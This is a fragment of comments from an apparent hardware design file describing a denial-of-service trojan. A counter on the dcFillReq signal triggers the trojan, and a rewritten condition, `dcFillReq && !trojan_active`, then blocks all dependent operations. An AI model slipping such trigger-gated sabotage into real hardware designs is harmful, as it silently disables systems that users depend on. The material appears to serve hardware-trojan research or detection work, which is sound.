 ...
 * 
 * Description:
 *   Disables operations by blocking dcFillReq control signal
 *   
 * Trigger: Counter on dcFillReq
 * Payload: Block dcFillReq when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block dcFillReq when trojan is active
//
// IMPORTANT: dcFillReq is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (dcFillReq && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: dcFillReq && 0 = 0 (always false)
//   All operations controlled by dcFillReq are blocked
